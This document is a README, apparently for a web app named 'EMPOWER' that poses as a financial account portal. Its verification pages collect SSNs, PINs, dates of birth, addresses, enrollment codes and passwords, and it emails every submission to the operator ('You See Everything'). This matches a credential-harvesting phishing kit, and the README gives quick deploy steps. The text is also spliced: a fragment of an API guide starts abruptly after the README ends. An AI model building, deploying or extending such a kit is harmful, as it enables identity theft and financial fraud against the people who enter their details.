# 🎯 EMPOWER - Financial Freedom Application

A comprehensive financial account management system with secure user authentication, account verification, and real-time email notifications.

## 🚀 Quick Start (2 minutes)

### **Windows Users:**
```powershell
# Double-click: deploy.bat
# OR in PowerShell:
.\deploy.bat
```

### **Mac/Linux Users:**
```bash
chmod +x deploy.sh
./deploy.sh
```

### **Manual Setup:**
```bash
npm install
npm start
```

Server runs on: **http://localhost:3000**

---

## ⚙️ Setup Your Email (Important!)

Create a `.env` file in the project folder:

```env
ADMIN_EMAIL=your-email@gmail.com
EMAIL_SERVICE=gmail
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
PORT=3000
```

### **Get Gmail App Password:**
1. Go to https://myaccount.google.com/apppasswords
2. Select "Mail" and your device
3. Copy the 16-character password
4. Paste into `EMAIL_PASSWORD` in `.env`

---

## 📚 Full Documentation

**For complete usage guide, see:** [USER_GUIDE.md](USER_GUIDE.md)

Includes:
- 📋 Detailed setup instructions
- 💻 How to use every feature
- 📡 All API endpoints with examples
- 📧 Email notification details
- 🐛 Troubleshooting guide

---

## ✨ What It Does

✅ **User Registration** - Create secure accounts with verification  
✅ **Login/Logout** - Session-based authentication  
✅ **Account Verification** - SSN, PIN, or Enrollment Code methods  
✅ **Email Notifications** - Get emailed everything users do:
   - Registrations (all data)
   - Login/Logout events
   - Account verifications
   - Profile updates
   - Password changes

✅ **Profile Management** - Users can update profile & change passwords  
✅ **SQLite Database** - All data stored in local database  

---

## 📊 You See Everything

Every time a user enters data, you get:
1. **Email notification** (instant alert)
2. **Database entry** (permanent record)

You'll see:
- Usernames, emails, passwords
- SSNs, PINs, enrollment codes
- Names, addresses, dates of birth
- Profile changes
- Password updates
- Login timestamps

---

## 🛠️ Requirements

- **Node.js** v14+ (https://nodejs.org)
- **npm** (comes with Node.js)
- **Email account** (Gmail recommended)
- **Browser** (any modern browser)

---

## 📂 Project Structure

```
EMPOWER/
├── index.html              # Homepage
├── register.html           # Registration page
├── verify.html             # Verification page
├── style.css              # Styling
│
├── server.js              # Main server file
├── database.js            # SQLite database setup
├── middleware.js          # Express middleware
│
├── routes/
│   ├── auth.js           # Authentication endpoints
│   └── users.js          # User management endpoints
│
├── utils/
│   ├── email.js          # Email notifications
│   └── index.js          # Utility functions
│
├── deploy.bat            # Windows deployment script
├── deploy.sh             # Linux/Mac deployment script
├── package.json          # Dependencies
├── .env.example          # Example env file
├── USER_GUIDE.md         # Full usage guide
└── README.md             # This file
```

---

## 🔑 Key Features

### **Three Verification Methods**
Users can verify their account using:
1. SSN + ZIP Code + Date of Birth
2. SSN + PIN
3. Plan Group ID + Enrollment Code

### **Real-Time Email System**
Get notified instantly when:
- 📩 User registers (all form data)
- 🔓 User logs in
- 🔒 User logs out
- ✅ User verifies account
- 📝 User updates profile
- 🔑 User changes password

### **Complete Data Tracking**
- All data stored in SQLite database (`empower.db`)
- All data emailed to your admin email
- Search and filter notifications in email inbox
- Backup database anytime by copying file

---

## 📡 API Endpoints Summary

### **Authentication**
- `POST /api/auth/register` - User registration
- `POST /api/auth/login` - User login
- `POST /api/auth/logout` - User logout
- `POST /api/auth/verify-no-pin` - Verify with SSN/ZIP/DOB
- `POST /api/auth/verify-with-pin` - Verify with PIN
- `POST /api/auth/verify-with-enrollment-code` - Verify with code

### **User Management**
- `GET /api/users/profile` - Get user profile
- `PUT /api/users/profile` - Update profile
- `POST /api/users/change-password` - Change password

For detailed API documentation with request/response examples, see [USER_GUIDE.md](USER_GUIDE.md#-api-endpoints)

---

## 📞 Troubleshooting

| Problem | Solution |
|---------|----------|
| Node.js not found | Download from https://nodejs.org |
| Port 3000 in use | Change PORT in `.env` to `3001` |
| Emails not sending | Check `.env` file & Gmail app password |
| Can't register | Password must have uppercase, lowercase, number, special char |
| Database issues | Delete `empower.db` and restart (auto-rebuilds) |

For more troubleshooting help, see [USER_GUIDE.md](USER_GUIDE.md#-troubleshooting)

---

## 📋 Quick Checklist

- [ ] Install Node.js
- [ ] Run `npm install`
- [ ] Create `.env` file with email config
- [ ] Get Gmail app password
- [ ] Run `deploy.bat` or `./deploy.sh`
- [ ] Open http://localhost:3000
- [ ] Test registration (you should get an email!)
- [ ] Check database file `empower.db` is created

---

## 🎯 Sample Registration Email

When a user registers, you receive:

```
FROM: your-email@gmail.com
SUBJECT: New EMPOWER Registration - john_doe

New User Registration - EMPOWER App
User Information:
  Username: john_doe
  Email: john@example.com
  Password: $2b$10$hashed_password_here
  First Name: John
  Last Name: Doe
  Registration Time: 2026-04-07T14:30:00.000Z
```

---

## 📖 Documentation Files

- **README.md** (this file) - Quick overview
- **[USER_GUIDE.md](USER_GUIDE.md)** - Complete usage guide with detailed instructions
- **EMAIL_SETUP.md** - Email configuration details
- **QUICKSTART.md** - Quick reference

---

## 🎉 You're Ready!

Your EMPOWER application is deployed and ready to:
1. ✅ Accept user registrations
2. ✅ Verify accounts
3. ✅ Manage user profiles
4. ✅ Email you everything in real-time
5. ✅ Store all data in database

**Enjoy full transparency of your financial application!** 🚀

---

**For complete instructions and API documentation, see [USER_GUIDE.md](USER_GUIDE.md)**

Response (201):
{
  "message": "User registered successfully",
  "user_id": 1
}
```

**Password Requirements:**
- At least 8 characters
- 1 uppercase letter
- 1 lowercase letter
- 1 number
- 1 special character (@$!%*?&)

#### 2. Login
```
POST /api/auth/login
Content-Type: application/json

{
  "username": "john_doe",
  "password": "SecurePass123!"
}

Response (200):
{
  "message": "Login successful",
  "token": "session_token_here",
  "user_id": 1
}
```

#### 3. Logout
```
POST /api/auth/logout
Authorization: Bearer <token>

Response (200):
{
  "message": "Logged out successfully"
}
```

#### 4. Verify Account
```
POST /api/auth/verify
Authorization: Bearer <token>
Content-Type: application/json

Three verification methods:

Method 1 - No PIN (SSN, ZIP, DOB):
{
  "method": "no-pin",
  "ssn": "123-45-6789",
  "zip_code": "12345",
  "date_of_birth": "01/15/1990"
}

Method 2 - PIN (SSN, PIN):
{
  "method": "pin",
  "ssn": "123-45-6789",
  "pin": "1234"
}

Method 3 - Plan Enrollment Code:
{
  "method": "enrollment-code",
  "plan_group_id": "GROUP123",
  "enrollment_code": "ENROLL456"
}

Response (200):
{
  "message": "Account verified successfully"
}
```

---

### User Profile Endpoints

#### 5. Get User Profile
```
GET /api/users/profile
Authorization: Bearer <token>

Response (200):
{
  "message": "User profile retrieved",
  "user": {
    "id": 1,
    "username": "john_doe",
    "email": "john@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "is_verified": 1,
    "verification_method": "no-pin",
    "created_at": "2024-01-01 10:00:00"
  }
}
```

#### 6. Update User Profile
```
PUT /api/users/profile
Authorization: Bearer <token>
Content-Type: application/json

{
  "first_name": "Jonathan",
  "last_name": "Doe",
  "email": "jonathan@example.com"
}

Response (200):
{
  "message": "Profile updated successfully"
}
```

#### 7. Change Password
```
POST /api/users/change-password
Authorization: Bearer <token>
Content-Type: application/json

{
  "current_password": "OldPass123!",
  "new_password": "NewPass456!",
  "confirm_password": "NewPass456!"
}

Response (200):
{
  "message": "Password changed successfully"
}
```

#### 8. Request Password Reset
```
POST /api/users/request-password-reset
Content-Type: application/json

{
  "email": "john@example.com"
}

Response (200):
{
  "message": "If email exists, a reset link will be sent",
  "reset_token": "token_here"  // Development only - removed in production
}
```

#### 9. Reset Password with Token
```
POST /api/users/reset-password
Content-Type: application/json

{
  "reset_token": "token_from_email",
  "new_password": "NewPass456!",
  "confirm_password": "NewPass456!"
}

Response (200):
{
  "message": "Password reset successful"
}
```

#### 10. Delete Account
```
DELETE /api/users/account
Authorization: Bearer <token>

Response (200):
{
  "message": "Account deleted successfully"
}
```

---

## Database Schema

### users
- `id` - Primary key
- `username` - Unique username
- `email` - Unique email
- `password_hash` - Bcrypt hashed password
- `first_name`, `last_name` - User name
- `ssn` - Social Security Number (encrypted in production)
- `zip_code` - ZIP code
- `date_of_birth` - DOB in MM/DD/YYYY format
- `pin` - Personal ID Number
- `plan_group_id` - Group ID for plan enrollment
- `enrollment_code` - Code for plan enrollment
- `is_verified` - Account verification status (0/1)
- `verification_method` - Method used for verification
- `created_at`, `updated_at` - Timestamps

### sessions
- `id` - Primary key
- `user_id` - Foreign key to users
- `session_token` - Unique session token
- `expires_at` - Token expiration time
- `created_at` - Creation timestamp

### password_resets
- `id` - Primary key
- `user_id` - Foreign key to users
- `reset_token` - Unique reset token
- `expires_at` - Token expiration time
- `created_at` - Creation timestamp

### verification_attempts
- `id` - Primary key
- `user_id` - Foreign key to users
- `method` - Verification method used
- `attempt_count` - Number of attempts
- `last_attempt` - Timestamp of last attempt

---

## Security Notes

### Current Implementation:
✅ Password hashing with bcryptjs (10 salt rounds)
✅ Session tokens for authentication
✅ SQL injection prevention with parameterized queries
✅ Password strength validation
✅ Email format validation
✅ CORS configuration

### Production Recommendations:
- [ ] Enable HTTPS/SSL
- [ ] Implement rate limiting
- [ ] Add request validation middleware
- [ ] Encrypt sensitive data (SSN, PIN) at rest
- [ ] Send password reset emails instead of returning tokens
- [ ] Implement two-factor authentication
- [ ] Add audit logging
- [ ] Use environment variables for all secrets
- [ ] Implement request logging
- [ ] Add input sanitization

---

## Testing API Endpoints

You can test the API using tools like:
- [Postman](https://www.postman.com/)
- [cURL](https://curl.se/)
- [VS Code REST Client](https://marketplace.visualstudio.com/items?itemName=humao.rest-client)

Example with cURL:
```bash
# Register
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","email":"john@example.com","password":"SecurePass123!"}'

# Login
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"SecurePass123!"}'

# Get Profile (replace TOKEN)
curl -X GET http://localhost:3000/api/users/profile \
  -H "Authorization: Bearer TOKEN"
```

---

## File Structure

```
EMPOWER/
├── server.js              # Main server file
├── database.js            # SQLite database initialization
├── utils.js               # Utility functions
├── middleware.js          # Express middleware
├── routes/
│   ├── auth.js           # Authentication routes
│   └── users.js          # User profile routes
├── package.json          # Dependencies
├── .env.example          # Environment template
├── .env                  # Environment configuration
└── empower.db            # SQLite database (created on first run)
```

---

## Troubleshooting

**Port already in use:**
```bash
# Change PORT in .env or specify on command line
PORT=3001 npm run dev
```

**Database locked:**
- Ensure only one instance is running
- Delete `empower.db` and restart if corrupted

**Token errors:**
- Ensure token is sent in Authorization header as `Bearer <token>`
- Check if token has expired (24 hour default)

---

## Support

For issues or questions, check the database logs in the console output.
